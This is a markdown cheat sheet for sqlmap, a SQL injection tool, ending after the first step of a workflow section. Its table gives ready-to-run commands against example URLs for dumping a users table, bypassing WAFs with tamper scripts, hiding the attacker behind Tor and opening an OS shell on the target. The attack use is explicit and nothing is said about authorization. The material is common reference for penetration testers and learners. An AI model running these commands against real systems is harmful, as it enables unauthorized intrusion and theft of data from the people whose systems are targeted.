# SQLmap Cheat Sheet
SQLmap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications.

| Command                                   | Description                                                        | Example                                                            | Used For                              |
|-------------------------------------------|--------------------------------------------------------------------|--------------------------------------------------------------------|---------------------------------------|
| `sqlmap -u [URL]`                         | Basic usage, target a URL for SQL injection detection.             | `sqlmap -u "http://example.com/vulnerable.php?id=1"`                | Detecting SQL injection vulnerabilities |
| `sqlmap -u [URL] --data="[POST data]"`     | Use POST data for SQL injection testing.                           | `sqlmap -u "http://example.com/login.php" --data="user=admin&pass=1234"` | Testing POST parameters               |
| `sqlmap -u [URL] --cookie="[cookie]"`      | Specify cookie for authentication or session management.          | `sqlmap -u "http://example.com/dashboard" --cookie="PHPSESSID=abcd1234"` | Using cookies for authenticated tests |
| `sqlmap -u [URL] --dbs`                   | Enumerates databases on the target.                                | `sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs`          | Database enumeration                  |
| `sqlmap -u [URL] --tables -D [database]`   | Enumerates tables in a specific database.                         | `sqlmap -u "http://example.com/vulnerable.php?id=1" --tables -D mydb` | Table enumeration                     |
| `sqlmap -u [URL] --columns -D [database] -T [table]` | Enumerates columns in a specific table.                        | `sqlmap -u "http://example.com/vulnerable.php?id=1" --columns -D mydb -T users` | Column enumeration                    |
| `sqlmap -u [URL] --dump -D [database] -T [table]` | Dumps data from a specific table.                                  | `sqlmap -u "http://example.com/vulnerable.php?id=1" --dump -D mydb -T users` | Data extraction                       |
| `sqlmap -u [URL] --technique=[technique]`  | Specify the injection technique (e.g., boolean-based, time-based). | `sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=BEUST` | Selecting specific attack techniques  |
| `sqlmap -u [URL] --level=[level]`          | Set the level of tests to be performed (1-5, higher = more tests). | `sqlmap -u "http://example.com/vulnerable.php?id=1" --level=5`      | Adjusting test depth                  |
| `sqlmap -u [URL] --risk=[risk]`            | Set the risk level (1-3, higher = more intrusive tests).          | `sqlmap -u "http://example.com/vulnerable.php?id=1" --risk=3`       | Adjusting risk of tests               |
| `sqlmap -u [URL] --threads=[number]`       | Set the number of threads for parallel execution.                  | `sqlmap -u "http://example.com/vulnerable.php?id=1" --threads=10`   | Speeding up the attack                |
| `sqlmap -u [URL] --time-sec=[seconds]`     | Set the delay between requests for time-based injections.         | `sqlmap -u "http://example.com/vulnerable.php?id=1" --time-sec=5`    | Fine-tuning time-based injections     |
| `sqlmap -u [URL] --batch`                  | Runs SQLmap automatically, skipping user interaction.              | `sqlmap -u "http://example.com/vulnerable.php?id=1" --batch`        | Automatic operation without prompts   |
| `sqlmap -u [URL] --tor`                    | Use Tor network for anonymity while testing.                      | `sqlmap -u "http://example.com/vulnerable.php?id=1" --tor`          | Anonymizing the attack                |
| `sqlmap -u [URL] --tamper=[script]`        | Use a tamper script to bypass WAF or other defenses.              | `sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=space2comment` | Bypassing defenses                   |
| `sqlmap -u [URL] --os-shell`               | Attempt to gain an operating system shell on the target machine. | `sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell`     | OS-level access after SQL injection   |

## Common SQLmap Workflow

1. **Basic SQL Injection Test**
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1"
```